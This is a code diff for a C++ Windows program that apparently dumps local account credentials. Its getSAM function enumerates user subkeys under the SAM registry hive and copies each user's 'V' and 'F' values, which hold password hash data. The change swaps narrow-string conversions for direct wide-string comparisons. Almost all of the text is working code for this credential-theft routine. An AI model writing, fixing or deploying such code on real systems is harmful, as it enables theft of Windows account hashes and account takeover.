@@ -12,6 +12,7 @@
 #include <BaseTsd.h>
 #include <ntstatus.h>
 #include <comdef.h>
+#include <string.h>
 
 #include "Main.h"
 
@@ -140,14 +141,9 @@ void getSAM(PSAM samRegEntries[], PULONG len) {
 				exit(ret);
 			}
 
-			_bstr_t aux(keyInfoSubKeysBasic->Name);
-			if (strncmp(aux, "00", strlen("00")) == 0) {
-				WCHAR aux2[MAX_PATH];
-				size_t outSize;
-				mbstowcs_s(&outSize, aux2, sizeof(WCHAR) * MAX_PATH, aux, _TRUNCATE);
-
+			if (wcsncmp(keyInfoSubKeysBasic->Name, L"00", wcslen(L"00")) == 0) {
 				WCHAR RegPathSubKey[MAX_PATH] = L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users\\";
-				wcsncat_s(RegPathSubKey, sizeof(WCHAR) * MAX_PATH, aux2, _TRUNCATE);
+				wcsncat_s(RegPathSubKey, MAX_PATH, keyInfoSubKeysBasic->Name, _TRUNCATE);
 
 				pMyRtlInitUnicodeString(&UnicodeRegPathSubKey, RegPathSubKey);
 				InitializeObjectAttributes(&attributesSubKey, &UnicodeRegPathSubKey, OBJ_CASE_INSENSITIVE, NULL, NULL);
@@ -169,9 +165,7 @@ void getSAM(PSAM samRegEntries[], PULONG len) {
 				}
 
 				PSAM sam = (PSAM)HeapAlloc(GetProcessHeap(), NULL, sizeof(SAM));
-				_bstr_t aux(keyInfoSubKeysBasic->Name);
-				char* aux3 = aux;
-				CopyMemory(sam->rid, aux3, keyInfoSubKeysBasic->NameLength);
+				CopyMemory(sam->rid, keyInfoSubKeysBasic->Name, keyInfoSubKeysBasic->NameLength);
 
 				//getClasses(sam);
 
@@ -186,13 +180,12 @@ void getSAM(PSAM samRegEntries[], PULONG len) {
 						exit(ret);
 					}
 
-					_bstr_t aux(keyValuesSubKey->Name);
-					if (strncmp(aux, "V", keyValuesSubKey->NameLength) == 0) {
+					if (wcsncmp(keyValuesSubKey->Name, L"V", keyValuesSubKey->NameLength) == 0) {
 						PVOID data = (PVOID)((ULONG_PTR)keyValuesSubKey + keyValuesSubKey->DataOffset);
 						CopyMemory(sam->v, data, keyValuesSubKey->DataLength);
 					}
 
-					if (strncmp(aux, "F", keyValuesSubKey->NameLength) == 0) {
+					if (wcsncmp(keyValuesSubKey->Name, L"F", keyValuesSubKey->NameLength) == 0) {
 						PVOID data = (PVOID)((ULONG_PTR)keyValuesSubKey + keyValuesSubKey->DataOffset);
 						CopyMemory(sam->f, data, keyValuesSubKey->DataLength);
 					}
